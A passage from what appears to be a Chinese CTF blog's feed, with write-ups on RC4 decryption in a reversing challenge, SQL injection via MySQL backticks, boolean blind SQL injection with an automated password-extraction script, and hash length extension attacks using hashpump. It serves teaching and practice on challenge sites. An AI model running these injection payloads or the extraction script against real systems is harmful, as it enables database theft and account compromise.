<span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)   <span class="comment">#初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line">        <span class="comment">#对称密码，加密解密算法一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br></pre></td></tr></table></figure><p>python中Crypto库中有该算法，具体用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> *</span><br><span class="line">data = <span class="string">"kangel"</span></span><br><span class="line">key = <span class="string">"key"</span></span><br><span class="line">cipher = ARC4.new(key)    <span class="comment">#加载密钥</span></span><br><span class="line">m = cipher.decrypt(key)   <span class="comment">#用该密钥解密</span></span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>RC4在有些情况下与sha1、base64一起混合使用，如果发现密文是base64编码，需考虑该算法，具体算法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tencode</span><span class="params">(data, key, encode=base64.b64encode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 encryption with random salt and final encoding"""</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(salt_length):</span><br><span class="line">        salt += chr(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdecode</span><span class="params">(data, key, decode=base64.b64decode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 decryption of encoded data"""</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line">    salt = data[:salt_length]</span><br><span class="line">    <span class="keyword">print</span> len(salt)</span><br><span class="line">    <span class="keyword">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 需要解密的数据</span></span><br><span class="line">    data = <span class="string">'UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw=='</span></span><br><span class="line">    <span class="comment"># 密钥</span></span><br><span class="line">    key = <span class="string">'welcometoicqedu'</span></span><br><span class="line">    <span class="comment"># 解码</span></span><br><span class="line">    decoded_data = tdecode(data=data, key=key)</span><br><span class="line">    <span class="comment">#decoded_data = crypt(data,m)</span></span><br><span class="line">    print(<span class="string">"明文是："</span>)</span><br><span class="line">    <span class="keyword">print</span> decoded_data</span><br><span class="line"><span class="comment">#bdctf&#123;YOU_CRAKE_THE_RC4&#125;</span></span><br></pre></td></tr></table></figure><h3 id="逆向题中的体现"><a href="#逆向题中的体现" class="headerlink" title="逆向题中的体现"></a>逆向题中的体现</h3><p>前天打了掘安杯，这明明是一道很简单的逆向，可就是得不出flag。</p><p>题目如下：程序为64位的ELF文件，用ida打开</p><p><img alt="" data-src="/2019/04/09/RC4/1.JPG" class="lazyload"></p><p>当时并不知道这是RC4（主要还是菜），但是RC4算法不难，所以很容易实现。刚开始被那一段<code>&gt;&gt;31&gt;&gt;24</code>迷惑了很久，还恶补了一堆东西，例如：</p><p>逻辑右移与算术右移（左移都是末尾补0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = 1011</span><br><span class="line">b = a &gt;&gt; 1</span><br><span class="line">#a为无符号数</span><br><span class="line">b = 0101</span><br><span class="line">#a为有符号数,最高位为符号位，不进行移位运算，补全补符号位</span><br><span class="line">b = 1101</span><br><span class="line">所以：对于整数来说，逻辑右移与算术右移结果相同。</span><br></pre></td></tr></table></figure><p>上面的代码中先是有符号int（32位）右移31位，然后无符右移24位。因为被以为的数均为正数，所以最终结果都是0。</p><p>int_64如何转化为int_8（取最低字节）：模256就行了</p><p>然后写着写着就变成了RC4，未经修改的原生态代码，虽然有点乱（额，其实是非常乱），但其实并没有什么问题</p><p>可就是答案不对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    a.append(i)</span><br><span class="line">v11 = <span class="number">0</span></span><br><span class="line">ch = <span class="string">"Th1sIsTheK3y"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    v11 = (v11 + a[j] + ord(ch[j%<span class="number">12</span>]))%<span class="number">256</span></span><br><span class="line">    v3 = a[j]</span><br><span class="line">    a[j]=a[v11]</span><br><span class="line">    a[v11] = v3</span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    v8 = (v8 +<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    v9 = (v9+a[v8])%<span class="number">256</span></span><br><span class="line">    b.append(a[(a[v9]+a[v8])%<span class="number">256</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(a)</span></span><br><span class="line"><span class="comment">#print(b)</span></span><br><span class="line">key = [<span class="number">0x1c</span>,<span class="number">0x61</span>,<span class="number">0x97</span>,<span class="number">0x34</span>,<span class="number">0x28</span>,<span class="number">0x69</span>,<span class="number">0xfa</span>,<span class="number">0x54</span>,<span class="number">0xda</span>,<span class="number">0x3a</span>,<span class="number">0x2b</span>,<span class="number">0xbb</span>,<span class="number">0x05</span>,<span class="number">0x09</span>,<span class="number">0x16</span>,<span class="number">0x38</span>,<span class="number">0xf3</span>,<span class="number">0xcf</span>,<span class="number">0xd8</span>,<span class="number">0xa5</span>,<span class="number">0x12</span>,<span class="number">0x7e</span>,<span class="number">0x67</span>,<span class="number">0x44</span>]</span><br><span class="line">print(key)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    flag+=chr(key[i]^b[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(b)</span><br><span class="line"><span class="keyword">print</span> len(key)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>后来看了官方wp，说是对key，进行了一次混淆。到了这里，我多说两句关于混淆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了有效抵抗攻击者对密码体制的攻击，Shannon提出三个基本设计思想--扩散、混淆（混乱）和乘积密码。</span><br><span class="line">扩散：一位明文变化导致多位密文变化</span><br><span class="line">混淆：进行多次加密</span><br></pre></td></tr></table></figure><p>这里有个puts函数，首先用key对key进行一次RC4，得到的新key再用来加密flag。由于忽略了这一点（主要还是因为菜），所以最终只能是望而却步。看了wp，在ida中alt+t中搜索call sub_400686（RC4函数），果然有两处。</p><p><img alt="" data-src="/2019/04/09/RC4/2.JPG" class="lazyload"></p><p>最后上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> *</span><br><span class="line">data = <span class="string">"\x1c\x61\x97\x34\x28\x69\xfa\x54\xda\x3a\x2b\xbb\x05\x09\x16\x38\xf3\xcf\xd8\xa5\x12\x7e\x67\x44"</span></span><br><span class="line">key = <span class="string">"Th1sIsTheK3y"</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line">m = cipher.decrypt(key)</span><br><span class="line">key_1 = ARC4.new(m)</span><br><span class="line">m = key_1.decrypt(data)</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>看似差之毫厘，实际则反映知识的掌握程度和解题的熟练程度。不说了，回炉再造去了。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RC4 </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql注入之反引号</title>
      <link href="/2019/04/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8D%E5%BC%95%E5%8F%B7/"/>
      <url>/2019/04/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8D%E5%BC%95%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="反引号在mysql中的作用"><a href="#反引号在mysql中的作用" class="headerlink" title="反引号在mysql中的作用"></a>反引号在mysql中的作用</h3><p>反引号在键盘的左上角，在mysql中可以区别保留字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select `select` from A;  #正确</span><br><span class="line">#假如存在表flag，用desc(describe)查询该表信息</span><br><span class="line">desc flag A;  #显示flag表信息，别名为A</span><br><span class="line">desc `flag` `A` #与上述语句相同</span><br></pre></td></tr></table></figure><h3 id="一道与之相关的web题"><a href="#一道与之相关的web题" class="headerlink" title="一道与之相关的web题"></a>一道与之相关的web题</h3><p>题目链接：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p><p>Hint1: 先找到源码再说吧~~</p><p>后台扫描，得到源码：<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当<code>table</code>为空时，输出<code>flag{xxx}</code>，说明存在表<code>secret_test</code>。我们直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select database() limit 1,1</span><br></pre></td></tr></table></figure><p>得到数据库61d00，接着爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema = database() limit 1,1</span><br></pre></td></tr></table></figure><p>得到secret_flag,secret_test，接着爆字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name = 0x7365637265745f666c6167 limit 1,1</span><br></pre></td></tr></table></figure><p>得到flagUwillNeverKnow，最后爆出flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow  from secret_flag limit 1,1</span><br></pre></td></tr></table></figure><p>flag{luckyGame~}</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该题只要清楚mysql中反引号的作用以及desc的使用，就变成了最基本的sql注入，没有过滤任何字符的注入。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> jarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>几种sql盲注</title>
      <link href="/2019/04/06/blindsqlinjection/"/>
      <url>/2019/04/06/blindsqlinjection/</url>
      
        <content type="html"><![CDATA[<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。</p><p>应用场景：根据用户名和密码的输入，页面返回密码错误和用户名错误两种类型。利用返回不同，逐个拆解密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">auth.php</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$username = str_replace(<span class="string">' '</span>, <span class="string">''</span>, $username); <span class="comment">//过滤空格</span></span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$sql = <span class="string">"select password from admin where username = '"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$rowcount = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">if</span> $rowcount == <span class="number">0</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'用户名错误'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ($rowcount--)&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username = <span class="string">'admin'</span> <span class="keyword">and</span> $password = $result[$row])&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'密码错误'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">"admin'^(ascii(mid((password)from(str（1)))=ord（1)^1#"</span></span><br></pre></td></tr></table></figure><p><code>^</code>表示异或，将username分为三段，<code>admin&#39;</code>（假设存在该用户名）和<code>1</code>异或为0，所以username的真值由<code>(ascii(mid((password)from(str（1)))=ord（1)</code>决定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid()函数</span><br><span class="line">mid（“kangel” from（str（3）） //返回&quot;kangel&quot;从第三个字符开始的所有字符，即&quot;gel&quot;</span><br><span class="line">assic()函数</span><br><span class="line">assic(&quot;abc&quot;)   //返回“abc”第一个字符的assic值，即97</span><br><span class="line">(ascii(mid((password)from(str（1)))=ord（1)   //password第一个字符assic值与&quot;1&quot;的assic值（49）进行比较</span><br></pre></td></tr></table></figure><p>因此，若过滤了<code>=</code>，则可以替换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;admin&apos;^(ascii(mid((password)from(str（1)))&lt;&gt;ord（1)^0#&quot;</span><br></pre></td></tr></table></figure><p>例题：<a href="http://web.jarvisoj.com:32787/login.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32787/login.php</a></p><p><img alt="" data-src="/2019/04/06/blindsqlinjection/1.JPG" class="lazyload"></p><p>判断登录漏洞类型，输入<code>admin</code>、<code>admin</code>返回密码错误，输入<code>kangel</code>、<code>123</code>返回用户名错误</p><p>继续判断过滤字符，username输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;^(ascii(mid((password)from(&apos;1&apos;))&lt;&gt;97^0#&quot;  //用户名错误</span><br><span class="line">admin&apos;^(ascii(mid((password)from(1)))=97)^0#    //密码错误</span><br></pre></td></tr></table></figure><p>该payload有效，猜测密码为md5值存储，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">str_hex = <span class="string">'0123456789abcdef'</span></span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_hex:</span><br><span class="line">        username = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(index),ord(i))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: username,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'admin'</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(username)</span><br><span class="line">        s = r.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            password += i</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>得到password：<code>334cfb59c9d74849801d5acdcfdaadc3</code>，MD5解密得：<code>eTAloCrEP</code>，用<code>admin</code>、<code>eTAloCrEP</code>登录得到flag。</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> jarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web </tag>
            
            <tag> 盲注 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hash长度扩展攻击</title>
      <link href="/2019/04/05/hash-attack/"/>
      <url>/2019/04/05/hash-attack/</url>
      
        <content type="html"><![CDATA[<h3 id="hash原理（以MD5为例）"><a href="#hash原理（以MD5为例）" class="headerlink" title="hash原理（以MD5为例）"></a>hash原理（以MD5为例）</h3><h4 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h4><p>MD5算法输入消息以512bit的分组为单位处理（sha1、sha256也是如此），共64字节。然后对每个分组进行一次“加密”，前一次的“加密”结果会作为这一次“加密”的输入，最后一次“加密”结果即为最终MD5值。不足64字节的分组需要进行补位，也就是字节填充。</p><p>补位原则：首先将需要hash的字符串进行分组，即字符串长度（以字节为单位）整除64，最后一组不足56字节的进行字节填充。填充的第一个字节为0x80，其他均为0x00。剩下的8个字节用来表示原字符串的长度。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>现在需要加密字符串：<code>hash_length_extend_attack</code>，共25字节。</p><p><img alt="" data-src="/2019/04/05/hash-attack/1.JPG" class="lazyload"></p><p>该字符串不足56字节，需进行补位。第一个字节为0x80，其余为0x00，填充至56位。</p><p><img alt="" data-src="/2019/04/05/hash-attack/2.JPG" class="lazyload"></p><p>最后8个字节为原字符串的长度描述符（以bit为单位），25字节共200bit，120转十六进制为0xc8。由于MD5的存储为小端位序。例如0x12345678存为0x78563412。</p><p><img alt="" data-src="/2019/04/05/hash-attack/3.JPG" class="lazyload"></p><h3 id="hash长度扩展攻击原理"><a href="#hash长度扩展攻击原理" class="headerlink" title="hash长度扩展攻击原理"></a>hash长度扩展攻击原理</h3><p>若<code>md5($salt.string1)</code>已知，则在salt未知的条件下可以求出<code>md5($salt.string1+padding+stirng2)</code>。</p><p>证明：因为<code>md5($salt.string1)=md5($salt.string1+padding</code>，因此<code>md5($salt.string1+padding+stirng2)</code>即为用<code>md5($salt.string1)</code>对<code>$string2+padding</code>进行一次“加密”。</p><p>工具：hashpump</p><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/HashPump<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0  <span class="comment">##md5($salt.string1)</span></span><br><span class="line">Input Data:  ;<span class="string">"tseug"</span>:5:s        <span class="comment">##string1</span></span><br><span class="line">Input Key Length: 11             <span class="comment">##salt长度</span></span><br><span class="line">Input Data to Add: ;<span class="string">"nimda"</span>:5:s  <span class="comment">##string2</span></span><br><span class="line">fcdc3840332555511c4e4323f6decb07    <span class="comment">##md5($salt.string1+padding+stirng2)</span></span><br><span class="line">;<span class="string">"tseug"</span>:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00;<span class="string">"nimda"</span>:5:s      <span class="comment">##$salt.string1+padding+stirng2</span></span><br></pre></td></tr></table></figure><p>下面结合两个具体题目来实现攻击</p><h3 id="题目一：salt长度已知"><a href="#题目一：salt长度已知" class="headerlink" title="题目一：salt长度已知"></a>题目一：salt长度已知</h3><p>题目链接：<a href="http://www.shiyanbar.com/ctf/1848" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1848</a></p><p>username和password输入admin、admin。响应出现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you have the correct credentials, log in below. If not, please LEAVE.</span><br></pre></td></tr></table></figure><p>查看源码，无任何提示。于是抓包分析。发现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=0; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1553478983,1554089005,1554300942,1554380508; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*130458%2CnickName%3AKANGEL; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1554380518; PHPSESSID=615uqh2qr9s16pr67f9bhs9ur6</span><br></pre></td></tr></table></figure><p>cookie中有hash值，有source。将<code>source=0</code>改为<code>source=1</code>，发现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span 